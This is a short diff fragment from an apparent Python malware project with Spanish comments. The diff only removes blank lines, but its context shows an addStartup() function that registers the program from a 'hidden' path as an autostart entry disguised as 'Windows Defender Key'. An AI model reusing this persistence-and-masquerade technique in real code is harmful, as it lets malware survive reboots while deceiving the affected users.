@@ -30,8 +30,6 @@ import socket    # Librería verifica internet
 
 
 
-
-
 def addStartup():  # function =  Iniciar automaticamente
     path = GetPathOcult()+ GetNameKey() # Path del Software completo
     name = "Windows Defender Key"                                                   # Nombre del StartUp     // Solo se ve en el registro *Regedit*
